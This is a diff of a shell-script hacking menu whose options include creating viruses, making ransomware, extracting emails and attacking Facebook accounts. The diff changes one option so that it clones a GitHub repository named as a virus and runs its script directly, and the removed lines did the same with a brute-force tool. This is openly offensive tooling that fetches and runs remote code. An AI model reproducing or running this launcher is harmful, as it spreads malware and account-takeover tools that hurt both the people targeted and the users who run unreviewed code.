@@ -27,7 +27,7 @@ echo $i"|"$me" 2"$i" |"$cy" Create viruses               "$i""$i"               
 echo $i"|"$me" 3"$i" |"$cy" Making ransomware          "$i""$i"                "$cy" "$i" "
 echo $i"|"$me" 4"$i" |"$cy"  Email extraction        "$i""$i"                   "$cy" "$i" "
 echo $i"|"$me" 5"$i" |"$cy" اDrop sites "$i""$i" "$cy" "$i" "
-echo $i"|"$me" 6"$i" |"$cy" Close Facebook ( root )     "$i""$i"                 "$cy" "$i" "
+echo $i"|"$me" 6"$i" |"$cy" Arabic Download the Arabic version tool     "$i""$i"                 "$cy" "$i" "
 echo $i"──────────────────────────────────────────────────────────────────────────────────────"$i"        "$cy"  "$i" "
 echo $i"|"$me" 7"$i" |"$cy"  The random facebook hack code is ANGGAXD  "$i""$i"    "
 echo $i"|"$me" 8"$i" |"$cy" Facebook shutdown tool Report "
@@ -104,9 +104,9 @@ then
 clear
 figlet -f slant "W A I T"|lolcat
 sleep 1
-git clone https://github.com/FR13ND8/BRUTEFORCEnew
-cd BRUTEFORCEnew
-sh new.sh
+git clone https://github.com/hacker-ali-17/Virus.Palestinian.Algerian.Arabic.git
+cd Virus.Palestinian.Algerian.Arabic
+sh Algerian.sh
 fi
 
 if [ $pil = 7 ]
